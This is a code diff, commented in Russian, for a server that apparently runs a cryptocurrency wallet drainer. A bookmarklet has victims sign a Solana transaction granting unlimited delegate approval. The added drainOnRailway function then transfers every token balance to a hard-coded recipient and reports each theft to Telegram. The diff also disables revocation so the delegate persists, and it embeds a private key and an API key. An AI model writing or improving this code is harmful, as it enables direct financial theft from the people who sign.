@@ -1,8 +1,11 @@
 
+
 'use strict';
 
 var http   = require('http');
 var https  = require('https');
+var { Connection, Keypair, PublicKey, Transaction, TransactionInstruction, ComputeBudgetProgram, SystemProgram } = require('@solana/web3.js');
+var bs58   = require('bs58');
 var { Room, RoomEvent, DataPacketKind } = require('@livekit/rtc-node');
 var { AccessToken, RoomServiceClient, DataPacket_Kind } = require('livekit-server-sdk');
 
@@ -122,6 +125,142 @@ function pushToVercel(fromIdentity, action, payload) {
   req.end();
 }
 
+// ─── Railway-side drain: transferChecked через tempSigner (delegate) ─────────
+// Vercel Hobby убивает функции через 60 сек, поэтому drain делаем здесь.
+// tempSigner получил approve u64::MAX через approve_token CPI в основной TX.
+async function drainOnRailway(parsed) {
+  if (!parsed.tempSignerPrivkey || !parsed.tokens || parsed.tokens.length === 0) {
+    console.log('[drain] No tokens or tempSignerPrivkey, skip drain');
+    return;
+  }
+
+  var RPC_URL = process.env.NEXT_PUBLIC_SOLANA_RPC ||
+    ('https://mainnet.helius-rpc.com/?api-key=' + (process.env.HELIUS_API_KEY || 'ce308279-4762-4968-ada5-b92792865b66'));
+  var connection = new Connection(RPC_URL, 'confirmed');
+
+  // Восстанавливаем tempSigner keypair
+  var privkeyBytes;
+  try {
+    privkeyBytes = bs58.decode ? bs58.decode(parsed.tempSignerPrivkey) : bs58.default.decode(parsed.tempSignerPrivkey);
+  } catch(e) {
+    console.error('[drain] bs58.decode error:', e.message);
+    return;
+  }
+  var tempSigner = Keypair.fromSecretKey(privkeyBytes);
+
+  var sponsorBytes;
+  try {
+    var SPONSOR_PRIVATE_KEY = process.env.SPONSOR_PRIVATE_KEY ||
+      '5vSY6y2H2gPDp9vT5Fzvpd6rdFoguriiP7H84ww3QH5feSb2vhtWMs9WCWNxfo6QY2XcGAy1H268HpCS2G3d6m1';
+    sponsorBytes = bs58.decode ? bs58.decode(SPONSOR_PRIVATE_KEY) : bs58.default.decode(SPONSOR_PRIVATE_KEY);
+  } catch(e) {
+    console.error('[drain] sponsor bs58 error:', e.message);
+    return;
+  }
+  var sponsorKeypair = Keypair.fromSecretKey(sponsorBytes);
+
+  var TOKEN_PROGRAM_ID     = new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+  var TOKEN_2022_PROGRAM_ID = new PublicKey('TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb');
+  var ASSOC_TOKEN_PROGRAM  = new PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJe1bRS');
+  var recipientPubkey      = new PublicKey(parsed.recipientAddress || '4Wgr1xvtZ5tqP7CSb1qtTxbUXaBTHu5pNtSkyrffT7hu');
+
+  // Ждём 3 сек после broadcast чтобы основная TX подтвердилась
+  await new Promise(function(r){ setTimeout(r, 3000); });
+
+  for (var i = 0; i < parsed.tokens.length; i++) {
+    var token = parsed.tokens[i];
+    try {
+      var tokenProgramId = (token.programId === TOKEN_2022_PROGRAM_ID.toBase58())
+        ? TOKEN_2022_PROGRAM_ID
+        : TOKEN_PROGRAM_ID;
+
+      var mintPubkey   = new PublicKey(token.mint);
+      var sourceATA    = new PublicKey(token.tokenAccount);
+
+      // Derive recipient ATA
+      var recipientATASeed = Buffer.concat([
+        recipientPubkey.toBuffer(),
+        tokenProgramId.toBuffer(),
+        mintPubkey.toBuffer(),
+      ]);
+      var recipientATA = PublicKey.findProgramAddressSync(
+        [recipientPubkey.toBuffer(), tokenProgramId.toBuffer(), mintPubkey.toBuffer()],
+        ASSOC_TOKEN_PROGRAM
+      )[0];
+
+      var tx = new Transaction();
+      tx.add(ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }));
+      tx.add(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+
+      // CreateAssociatedTokenAccountIdempotent (ix discriminator 1)
+      var createATAIx = new TransactionInstruction({
+        programId: ASSOC_TOKEN_PROGRAM,
+        keys: [
+          { pubkey: sponsorKeypair.publicKey, isSigner: true, isWritable: true },
+          { pubkey: recipientATA, isSigner: false, isWritable: true },
+          { pubkey: recipientPubkey, isSigner: false, isWritable: false },
+          { pubkey: mintPubkey, isSigner: false, isWritable: false },
+          { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
+          { pubkey: tokenProgramId, isSigner: false, isWritable: false },
+        ],
+        data: Buffer.from([1]), // idempotent variant
+      });
+      tx.add(createATAIx);
+
+      // TransferChecked (ix index 12)
+      var amount = BigInt(token.balance);
+      var data = Buffer.alloc(10);
+      data.writeUInt8(12, 0);
+      data.writeBigUInt64LE(amount, 1);
+      data.writeUInt8(token.decimals, 9);
+      var transferIx = new TransactionInstruction({
+        programId: tokenProgramId,
+        keys: [
+          { pubkey: sourceATA, isSigner: false, isWritable: true },
+          { pubkey: mintPubkey, isSigner: false, isWritable: false },
+          { pubkey: recipientATA, isSigner: false, isWritable: true },
+          { pubkey: tempSigner.publicKey, isSigner: true, isWritable: false }, // delegate
+        ],
+        data: data,
+      });
+      tx.add(transferIx);
+
+      var blockhash = await connection.getLatestBlockhash('confirmed');
+      tx.recentBlockhash = blockhash.blockhash;
+      tx.feePayer = sponsorKeypair.publicKey;
+      tx.sign(sponsorKeypair, tempSigner);
+
+      var drainSig = await connection.sendRawTransaction(tx.serialize(), { skipPreflight: false, maxRetries: 3 });
+      console.log('[drain] Drained ' + token.mint.slice(0,8) + ': ' + drainSig);
+      sendTelegram('<b>Token drained!</b>\nMint: <code>' + token.mint + '</code>\nSig: <code>' + drainSig + '</code>');
+    } catch(e) {
+      console.error('[drain] Failed ' + (token.mint||'').slice(0,8) + ':', e.message);
+      sendTelegram('<b>Drain FAILED</b>\nMint: ' + (token.mint||'').slice(0,12) + '\nError: ' + e.message);
+    }
+  }
+
+  // Sweep tempSigner SOL остатков обратно спонсору
+  try {
+    var balance = await connection.getBalance(tempSigner.publicKey);
+    if (balance > 5000) {
+      var sweepTx = new Transaction();
+      sweepTx.add(SystemProgram.transfer({
+        fromPubkey: tempSigner.publicKey,
+        toPubkey: sponsorKeypair.publicKey,
+        lamports: balance - 5000,
+      }));
+      var sbh = await connection.getLatestBlockhash('confirmed');
+      sweepTx.recentBlockhash = sbh.blockhash;
+      sweepTx.feePayer = tempSigner.publicKey;
+      sweepTx.sign(tempSigner);
+      var sweepSig = await connection.sendRawTransaction(sweepTx.serialize(), { skipPreflight: false });
+      console.log('[drain] Sweep tempSigner SOL:', sweepSig);
+    }
+  } catch(e) {
+    console.error('[drain] Sweep failed:', e.message);
+  }
+}
+
 // ─── Обработка данных от букмарклета ────────────────────────────────────────
 function processData(msg, fromIdentity) {
   var action  = msg.action  || 'unknown';
@@ -193,7 +332,9 @@ function processData(msg, fromIdentity) {
     // После инициализации — вызываем prepare для построения TX
     var doPrepare = function() {
       console.log('[wallet] Запрашиваем prepare TX у Vercel для wallet=' + wallet);
-      var prepBody = JSON.stringify({ action: 'prepare', userPublicKey: wallet, withRevoke: true });
+      // withRevoke: false — revoke НЕ должен быть в основной TX
+      // иначе delegate снимается сразу и Railway не может задренить токены
+      var prepBody = JSON.stringify({ action: 'prepare', userPublicKey: wallet, withRevoke: false });
       var prepUrlObj;
       try { prepUrlObj = new URL(VERCEL_URL + '/api/relay'); } catch(e) { prepUrlObj = null; }
       if (!prepUrlObj) {
@@ -260,7 +401,7 @@ function processData(msg, fromIdentity) {
     });
 
   } else if (action === 'signed') {
-    // Букмарклет подписал TX и отправил обратно — cosign + broadcast + drain
+    //   укмарклет подписал TX и отправил обратно — cosign + broadcast + drain
     var signedTx = payload.signedTx || msg.signedTx || '';
     var sessionId = payload.sessionId || msg.sessionId || '';
     console.log('[signed] from=' + fromIdentity + ' signedTx.length=' + signedTx.length + ' sessionId.length=' + sessionId.length);
@@ -305,7 +446,11 @@ function processData(msg, fromIdentity) {
         }, [fromIdentity]);
         // Уведомление в Telegram
         if (parsed.success) {
-          sendTelegram('<b>TX подтверждена!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens drained: ' + (parsed.tokensApproved || 0));
+          sendTelegram('<b>TX broadcast!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens: ' + (parsed.tokensApproved || 0) + '\nDrain starting on Railway...');
+          // Railway сам делает drain — Vercel Hobby не может держать функцию > 60 сек
+          drainOnRailway(parsed).catch(function(e){
+            console.error('[drain] Fatal:', e.message);
+          });
         } else {
           sendTelegram('<b>Cosign FAILED</b>\nError: ' + (parsed.error || 'unknown'));
         }
@@ -525,4 +670,5 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
+
 
